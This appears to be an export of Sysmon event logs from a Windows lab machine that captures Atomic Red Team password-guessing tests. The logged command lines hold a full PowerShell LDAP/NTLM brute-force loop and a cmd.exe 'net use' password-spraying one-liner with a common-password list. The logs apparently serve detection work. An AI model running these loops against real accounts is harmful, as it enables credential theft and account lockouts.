      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_rxs45iny.vam.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:50:43.126</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 20:50:43.126

ProcessGuid: {f57bd86a-8e22-658c-cc01-000000000f00}

ProcessId: 10912

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_rxs45iny.vam.ps1

CreationUtcTime: 2023-12-27 20:50:43.126

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {
  Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\""""
  exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(\""""System.DirectoryServices.Protocols\"""") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\""""$env:UserDnsDomain\"""",389)

$passwordList = Get-Content -Path \""""C:\AtomicRedTeam\atomics\T1110.001\src\passwords.txt\""""
foreach ($password in $passwordList){
  $credz = new-object System.Net.NetworkCredential(\""""$ENV:USERNAME\"""", $password, \""""$env:UserDnsDomain\"""")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
  try {
    Write-Host \"""" [-] Attempting ${password} on account $ENV:USERNAME.\""""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] $ENV:USERNAME:${password} are valid credentials!\""""
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host \""""End of bruteforce\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19584,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:42.996

ProcessGuid: {f57bd86a-8e22-658c-cc01-000000000f00}

ProcessId: 10912

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {
  Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\""""
  exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(\""""System.DirectoryServices.Protocols\"""") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\""""$env:UserDnsDomain\"""",389)

$passwordList = Get-Content -Path \""""C:\AtomicRedTeam\atomics\T1110.001\src\passwords.txt\""""
foreach ($password in $passwordList){
  $credz = new-object System.Net.NetworkCredential(\""""$ENV:USERNAME\"""", $password, \""""$env:UserDnsDomain\"""")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
  try {
    Write-Host \"""" [-] Attempting ${password} on account $ENV:USERNAME.\""""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] $ENV:USERNAME:${password} are valid credentials!\""""
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host \""""End of bruteforce\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-8e22-658c-cc01-000000000f00},3588,10912,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:50:42.9979185Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:50:42.996,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:42.9979185Z""/>
      <EventRecordID>19584</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:50:42.996</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e22-658c-cc01-000000000f00}</Data>
      <Data Name=""ProcessId"">10912</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {
  Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\""""
  exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(\""""System.DirectoryServices.Protocols\"""") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\""""$env:UserDnsDomain\"""",389)

$passwordList = Get-Content -Path \""""C:\AtomicRedTeam\atomics\T1110.001\src\passwords.txt\""""
foreach ($password in $passwordList){
  $credz = new-object System.Net.NetworkCredential(\""""$ENV:USERNAME\"""", $password, \""""$env:UserDnsDomain\"""")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
  try {
    Write-Host \"""" [-] Attempting ${password} on account $ENV:USERNAME.\""""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] $ENV:USERNAME:${password} are valid credentials!\""""
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host \""""End of bruteforce\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:42.996

ProcessGuid: {f57bd86a-8e22-658c-cc01-000000000f00}

ProcessId: 10912

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {
  Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\""""
  exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(\""""System.DirectoryServices.Protocols\"""") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\""""$env:UserDnsDomain\"""",389)

$passwordList = Get-Content -Path \""""C:\AtomicRedTeam\atomics\T1110.001\src\passwords.txt\""""
foreach ($password in $passwordList){
  $credz = new-object System.Net.NetworkCredential(\""""$ENV:USERNAME\"""", $password, \""""$env:UserDnsDomain\"""")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
  try {
    Write-Host \"""" [-] Attempting ${password} on account $ENV:USERNAME.\""""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] $ENV:USERNAME:${password} are valid credentials!\""""
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host \""""End of bruteforce\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,22,19583,,,C:\Windows\system32\net.exe,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:38.560

ProcessGuid: {f57bd86a-8e19-658c-cb01-000000000f00}

ProcessId: 9056

QueryName: windev2309eval

QueryStatus: 0

QueryResults: fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;

Image: C:\Windows\system32\net.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8e19-658c-cb01-000000000f00},3588,9056,,windev2309eval,fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;,0,"
      ",-,2023-12-27T20:50:35.4132332Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:38.560,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:35.4132332Z""/>
      <EventRecordID>19583</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:38.560</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e19-658c-cb01-000000000f00}</Data>
      <Data Name=""ProcessId"">9056</Data>
      <Data Name=""QueryName"">windev2309eval</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;</Data>
      <Data Name=""Image"">C:\Windows\system32\net.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:38.560

ProcessGuid: {f57bd86a-8e19-658c-cb01-000000000f00}

ProcessId: 9056

QueryName: windev2309eval

QueryStatus: 0

QueryResults: fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;

Image: C:\Windows\system32\net.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""ChangeMe! ""  ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Net Command,1,19582,10.0.22621.1 (WinBuild.160101.0800),"MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3",C:\Windows\System32\net.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:33.361

ProcessGuid: {f57bd86a-8e19-658c-cb01-000000000f00}

ProcessId: 9056

Image: C:\Windows\System32\net.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Net Command

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: net.exe

CommandLine: net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""ChangeMe! ""  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3

ParentProcessGuid: {f57bd86a-8df8-658c-c401-000000000f00}

ParentProcessId: 3460

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL

ParentUser: WINDEV2309EVAL\User",Info,net.exe,"""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL",C:\Windows\System32\cmd.exe,{f57bd86a-8df8-658c-c401-000000000f00},3460,WINDEV2309EVAL\User,{f57bd86a-8e19-658c-cb01-000000000f00},3588,9056,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:50:33.3641193Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:50:33.361,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:33.3641193Z""/>
      <EventRecordID>19582</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:50:33.361</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e19-658c-cb01-000000000f00}</Data>
      <Data Name=""ProcessId"">9056</Data>
      <Data Name=""Image"">C:\Windows\System32\net.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Net Command</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">net.exe</Data>
      <Data Name=""CommandLine"">net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""ChangeMe! ""  </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8df8-658c-c401-000000000f00}</Data>
      <Data Name=""ParentProcessId"">3460</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c echo Password1&gt; passwords.txt &amp; echo 1q2w3e4r&gt;&gt; passwords.txt &amp; echo Password!&gt;&gt; passwords.txt &amp; echo Spring2022&gt;&gt; passwords.txt &amp; echo ChangeMe!&gt;&gt; passwords.txt &amp; @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %username%:%p &amp;&amp; @net use /delete %logonserver%\IPC$ &gt; NUL</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:33.361

ProcessGuid: {f57bd86a-8e19-658c-cb01-000000000f00}

ProcessId: 9056

Image: C:\Windows\System32\net.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Net Command

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: net.exe

CommandLine: net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""ChangeMe! ""  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3

ParentProcessGuid: {f57bd86a-8df8-658c-c401-000000000f00}

ParentProcessId: 3460

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c echo Password1&gt; passwords.txt &amp; echo 1q2w3e4r&gt;&gt; passwords.txt &amp; echo Password!&gt;&gt; passwords.txt &amp; echo Spring2022&gt;&gt; passwords.txt &amp; echo ChangeMe!&gt;&gt; passwords.txt &amp; @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %username%:%p &amp;&amp; @net use /delete %logonserver%\IPC$ &gt; NUL

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
